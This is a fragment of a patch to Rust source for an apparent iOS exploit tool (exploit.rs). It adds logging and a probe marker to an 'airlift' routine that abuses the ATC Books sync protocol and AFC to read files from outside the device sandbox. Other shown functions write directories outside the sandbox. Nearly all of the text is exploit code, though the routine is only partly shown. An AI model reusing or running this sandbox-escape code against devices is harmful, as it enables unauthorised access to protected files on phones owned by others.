@@ -23,7 +23,7 @@ index 1ff754d..b7db802 100644
  // Returns 0 on success, 1 on error (with out_error set).
  int32_t al_exploit_write_dir(const char *pairing_path,
 diff --git a/rust-core/src/exploit.rs b/rust-core/src/exploit.rs
-index a759c80..5324b2b 100644
+index a759c80..664b5a9 100644
 --- a/rust-core/src/exploit.rs
 +++ b/rust-core/src/exploit.rs
 @@ -552,6 +552,42 @@ pub unsafe fn run(
@@ -69,7 +69,7 @@ index a759c80..5324b2b 100644
  /// Write all files in `source_dir` directly to `target_dir` on the device outside the sandbox.
  ///
  /// # Safety
-@@ -1862,6 +1898,289 @@ async fn exploit_device_respring(
+@@ -1862,6 +1898,293 @@ async fn exploit_device_respring(
      }
  }
  
@@ -136,7 +136,7 @@ index a759c80..5324b2b 100644
 +    let identifiers = vec![link_identifier, target_identifier];
 +    let destinations = vec![link_destination.clone(), recovered_destination.clone()];
 +
-+    let archive = build_archive(&target_dir, &[])
++    let archive = build_archive(&target_dir, b"airlift-read-probe")
 +        .map_err(|e| format!("build_archive: {e}"))?;
 +    let books_plist = build_books_plist(&identifiers)
 +        .map_err(|e| format!("build_books_plist: {e}"))?;
@@ -311,6 +311,7 @@ index a759c80..5324b2b 100644
 +        file_complete_params.insert("Dataclass".into(), plist::Value::String("Book".into()));
 +        file_complete_params.insert("AssetPath".into(), plist::Value::String(dest.clone()));
 +        send_atc_dict(&mut atc_stream, &make_atc_msg("FileComplete", 1, Some(file_complete_params))).await?;
++        logger.log(format!("airlift: FileComplete sent [{}/{}] for read '{leaf}'", idx + 1, identifiers.len()));
 +        if idx + 1 < identifiers.len() {
 +            tokio::time::sleep(std::time::Duration::from_millis(900)).await;
 +        }
@@ -319,7 +320,7 @@ index a759c80..5324b2b 100644
 +    drop(atc_stream);
 +
 +    let mut recovered: Option<Vec<u8>> = None;
-+    for _ in 0..80 {
++    for attempt in 0..80 {
 +        if let Ok(mut fd) = afc.open(&recovered_destination, AfcFopenMode::RdOnly).await {
 +            if let Ok(data) = fd.read_entire().await {
 +                let _ = fd.close().await;
@@ -327,6 +328,9 @@ index a759c80..5324b2b 100644
 +                break;
 +            }
 +            let _ = fd.close().await;
++        }
++        if attempt % 10 == 9 {
++            logger.log(format!("airlift: waiting for recovered {ios_path} (attempt {})", attempt + 1));
 +        }
 +        tokio::time::sleep(std::time::Duration::from_millis(250)).await;
 +    }
